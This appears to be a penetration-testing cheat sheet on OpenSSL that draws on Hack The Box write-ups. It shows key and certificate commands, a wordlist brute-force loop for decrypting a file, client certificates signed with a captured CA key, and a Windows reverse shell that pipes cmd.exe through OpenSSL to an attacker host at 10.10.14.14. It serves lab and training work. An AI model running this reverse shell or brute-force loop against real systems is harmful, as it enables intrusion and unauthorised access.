# OpenSSL

## Open SSL Information

OpenSSL is a robust, commercial-grade, and full-featured toolkit for the Transport Layer Security \(TLS\) and Secure Sockets Layer \(SSL\) protocols. It is also a general-purpose cryptography library. For more information about the team and community around the project, or to start making your own contributions, start with the [community](https://www.openssl.org/community) page. To get the latest news, download the source, and so on, please see the sidebar or the buttons at the top of every page.

OpenSSL is licensed under an Apache-style license, which basically means that you are free to get and use it for commercial and non-commercial purposes subject to some simple license conditions.

The text above was extracted from here:

{% embed url="https://www.openssl.org/" %}

The **openssl** program is a command-line tool for using the various cryptography functions of OpenSSL's **crypto** library from the shell. It can be used for

```text
o  Creation and management of private keys, public keys and parameters
o  Public key cryptographic operations
o  Creation of X.509 certificates, CSRs and CRLs
o  Calculation of Message Digests
o  Encryption and Decryption with Ciphers
o  SSL/TLS Client and Server Tests
o  Handling of S/MIME signed or encrypted mail
o  Time Stamp requests, generation and verification
```

Reference:

{% embed url="https://linux.die.net/man/1/openssl" %}

### Private Keys

We can generate a private key as follows:

```text
openssl genrsa -out priv.key 2048
```

## Certificates

```text
openssl genrsa -out filename.key 2048

openssl req -new -key filename.key -out filename.csr

openssl x509 -req -in filename.csr -CA <target>.cert -CAKey <target>.key -CAcreateserial -out filename.pem -days 1024 -sha256

openssl pkcs12 -export -out filename.pfx -inkey filename.key -in filename.pem -certfile filename.cert
```

## Encrypted File

We can decrypt an encrypted file with bruteforcing using bash:

```bash
cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
```

Alternatively, we can use [openssl-bruteforce](https://github.com/HrushikeshK/openssl-bruteforce):

```bash
python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
```

# Shell via OpenSSL

The information in this section is from [0xdf HTB: Ethereal writeup](https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html#shell-via-openssl).

First, generate an SSL certificate:

```sh
root@kali# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes                                                                                    
Generating a RSA private key
.................................................................................................................................++++                                                                                      
..................................++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

root@kali# ls *.pem
cert.pem  key.pem
```

Then test the connection to the remote service. In this case I'm using Windows based system:

```sh
quiet ( echo "test" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 )
```

Now from the attacker machine we should have a listener to receive the output:

```sh
root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
"test"
```

We can create a shell by using two openssl calls, one will be piping the output into cmd and the output of that piped into the other. We can type commands into one connection and get results back on the other.


We値l start two openssl services just as above, and then on Windows:

```sh
quiet start cmd /c "c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"
```

The `start` is essential here as it opens this in a new process so that it stays running after the web request times out.

The listener on port 73 doesn稚 print anything but on port 136, we should receive the shell:

```
root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

# Client Certificate

The information below is from [0xdf HTB Fortune writeup](https://0xdf.gitlab.io/2019/08/03/htb-fortune.html#create-client-certificate)

We can generate a client certificate by using the CA cert and key:

```sh
root@kali# openssl genrsa -out filename.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
................+++++
.....................................................+++++
```

`genrsa` is used to create a 2048 bit key.

Next, we値l use that key to create a certificate signing request (csr). This request will have all the information about us and it will be asscoaited with the key. We can use the `req` command to request a new csr by receiving the key and the name of the file to output:

```sh
root@kali# openssl req -new -key filename.key -out filename.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:  
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fortune
Organizational Unit Name (eg, section) []:Fortune
Common Name (e.g. server FQDN or YOUR name) []:0xdf
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Next, we値l use the `x509` command to create the signed client certificate. We値l need to provide the csr, the CA certificate, and the CA key. We could create a new serial with the `-CAcreateserial` option, as well as specifying the output file, and the number of days it will be valid:

```sh
root@kali# openssl x509 -req -in filename.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out filename.pem -days 1024
Signature ok
subject=C = US, ST = Some-State, O = Fortune, OU = Fortune, CN = 0xdf
Getting CA Private Key
```

Finally, we値l use the `pkcs12` command to combine the new client key and client certificate into a pfx file format that Firefox can import:

```sh
root@kali# openssl pkcs12 -export -out filename.pfx -inkey filename.key -in filename.pem -certfile intermediate.cert.pem 
Enter Export Password:
Verifying - Enter Export Password:
```

